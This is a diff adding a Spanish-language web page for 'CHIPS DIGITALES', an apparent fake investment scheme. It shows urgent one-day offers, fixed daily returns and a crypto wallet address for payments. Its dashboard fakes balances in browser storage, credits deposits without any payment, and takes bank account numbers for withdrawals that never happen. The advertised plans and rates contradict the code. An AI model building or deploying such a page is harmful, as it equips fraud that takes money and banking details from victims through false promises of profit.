@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>CHIPS DIGITALES</title>
+<div style="margin-top:20px;">
+<div style="margin-top:20px;">
+<div style="margin-top:30px; display:flex; justify-content:center; flex-wrap:wrap;">
+
+<img src="https://" width="240"
+style="border-radius:25px; margin:15px; box-shadow:0 0 30px #111;">
+
+<img src="https://" width="240"
+style="border-radius:25px; margin:15px; box-shadow:0 0 30px #111;">
+
+</div>
+</div>
+<style>
+body{background:#0a0a0a;color:white;font-family:Arial;text-align:center}
+input,button,select{margin:5px;padding:8px}
+.plan{border:1px solid #00ffcc;margin:10px;padding:10px;cursor:pointer}
+.hidden{display:none}
+</style>
+
+</head>
+
+<body>
+
+<h1>CHIPS DIGITALES</h1>Empresa valuado en 1.5 mil millones de dólares.
+  
+  
+<nav>
+  
+<button onclick="show('login')">Login</button>
+<button onclick="show('register')">Registro</button>
+<button onclick="show('plans')">Planes</button>
+<button onclick="show('dashboard')">Dashboard</button>
+</nav>
+
+<div id="login">
+<h2>Login</h2>
+<input id="luser" placeholder="Usuario">
+<input id="lpass" type="password" placeholder="Contraseña">
+<button onclick="login()">Entrar</button>
+</div>
+OFERTA SOLO POR 1 DÍAS.
+
+  RECLAMAR AQUÍ 👇
+  OFERTA SOLO POR 1 DÍA.<br>
+<br>
+
+<br>
+PRECIO: S/175
+WALLET: TB1vZrQ5RFKTsfZc3VeckfPxf4tS6pAhF5
+<div id="register" class="hidden">
+<h2>Registro</h2>
+<input id="ruser" placeholder="Usuario">
+<input id="rpass" type="password" placeholder="Contraseña">
+<button onclick="register()">Crear cuenta</button>
+</div>
+
+<div id="plans" class="hidden">
+<h2>Planes</h2>
+<div class="plan" onclick="setPlan(700)">Plan 175 → +15 diarios</div>
+<div class="plan" onclick="setPlan(1000)">Plan 450 → +29 diarios</div>
+<div class="plan" onclick="setPlan(1500)">Plan 700 → +49 diarios</div>
+</div>
+
+<div id="dashboard" class="hidden">
+<h2>Dashboard</h2>
+
+<p>Usuario: Mariluz Quispe Huaman <span id="user"></span></p>
+<p>Saldo: S/845 <span id="bal"></span></p>
+<p>Plan: 700 <span id="plan"></span></p>
+
+<h3>Depositar</h3>
+<p>Wallet: TB1vZrQ5RFKTsfZc3VeckfPxf4tS6pAhF5 <span id="wallet"></span></p>
+<button onclick="copy()">Copiar</button>
+<button onclick="deposit()">Depositar 200</button>
+
+<h3>Retirar</h3>
+<input id="acc" placeholder="Cuenta bancaria">
+<select>
+<option>BCP</option>
+<option>BBVA</option>
+<option>Interbank</option>
+<option>Scotiabank</option>
+<option>BanBif</option>
+</select>
+<button onclick="withdraw()">Retirar 500</button>
+
+</div>
+
+<script>
+
+const wallet="TB1vZrQ5RFKTsfZc3VeckfPxf4tS6pAhF5";
+
+function show(id){
+["login","register","plans","dashboard"].forEach(x=>{
+document.getElementById(x).classList.add("hidden");
+});
+document.getElementById(id).classList.remove("hidden");
+}
+
+function register(){
+let u=ruser.value;
+let p=rpass.value;
+let users=JSON.parse(localStorage.getItem("users"))||{};
+
+if(users[u]){alert("Usuario existe");return;}
+
+users[u]={pass:p,balance:0,plan:null,last:Date.now()};
+localStorage.setItem("users",JSON.stringify(users));
+alert("Registrado");
+}
+
+function login(){
+let u=luser.value;
+let p=lpass.value;
+let users=JSON.parse(localStorage.getItem("users"))||{};
+
+if(!users[u]||users[u].pass!==p){
+alert("Error");return;
+}
+
+localStorage.setItem("current",u);
+show("dashboard");
+update();
+}
+
+function setPlan(p){
+let u=localStorage.getItem("current");
+if(!u){alert("Login primero");return;}
+
+let users=JSON.parse(localStorage.getItem("users"));
+
+users[u].plan=p;
+users[u].balance=p;
+users[u].last=Date.now();
+
+localStorage.setItem("users",JSON.stringify(users));
+
+alert("Plan activado");
+update();
+}
+
+function earn(u){
+let rates={700:15,1000:29,1500:59};
+
+if(!u.plan)return;
+
+let now=Date.now();
+let diff=now-u.last;
+
+let d=Math.floor(diff/(1000*60*60*24));
+
+if(d>0){
+u.balance+=rates[u.plan]*d;
+u.last=now;
+}
+}
+
+function update(){
+let u=localStorage.getItem("current");
+let users=JSON.parse(localStorage.getItem("users"));
+let data=users[u];
+
+earn(data);
+
+localStorage.setItem("users",JSON.stringify(users));
+
+document.getElementById("user").innerText=u;
+document.getElementById("bal").innerText=data.balance;
+document.getElementById("plan").innerText=data.plan||"Ninguno";
+document.getElementById("wallet").innerText=wallet;
+}
+
+function deposit(){
+let u=localStorage.getItem("current");
+let users=JSON.parse(localStorage.getItem("users"));
+
+users[u].balance+=500;
+
+localStorage.setItem("users",JSON.stringify(users));
+alert("Depósito");
+update();
+}
+
+function withdraw(){
+let acc=document.getElementById("acc").value;
+
+if(!acc){alert("Ingresa cuenta");return;}
+
+let u=localStorage.getItem("current");
+let users=JSON.parse(localStorage.getItem("users"));
+
+if(users[u].balance<500){
+alert("Mínimo 100");return;
+}
+
+users[u].balance-=500;
+
+localStorage.setItem("users",JSON.stringify(users));
+
+alert("Enviado en 5-10 días");
+update();
+}
+
+function copy(){
+navigator.clipboard.writeText(wallet);
+alert("Copiado");
+}
+
+</script>
+
+</body>
+</html>
